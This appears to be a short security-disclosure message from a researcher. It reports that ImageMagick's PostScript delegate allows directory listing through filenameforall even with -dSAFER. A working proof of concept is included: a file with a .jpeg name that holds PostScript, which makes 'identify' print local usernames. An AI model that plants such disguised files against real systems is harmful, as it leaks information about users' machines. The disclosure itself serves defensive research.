You know, you reminded me that the pdf and/or the ps delegate probably
allows filesystem enumeration via filenameforall, as far as I know
that's permitted with -dSAFER. I think that's probably unexpected.

For example, if you try to identify a file like this, it will list
local usernames on stdout, I guess a real attack would have to encode
that in the output somehow, but I only know enough postscript to know
i'd rather write bf. Might be a fun exercise for masochistic hackers
though.

$ cat whatever.jpeg
%PDF-1.0
(/home/*) {==} 256 string filenameforall
$ identify whatever.jpeg
(/home/taviso)
identify.im6: Postscript delegate failed `whatever.jpeg': No such file
or directory @ error/pdf.c/ReadPDFImage/677.

Tavis.
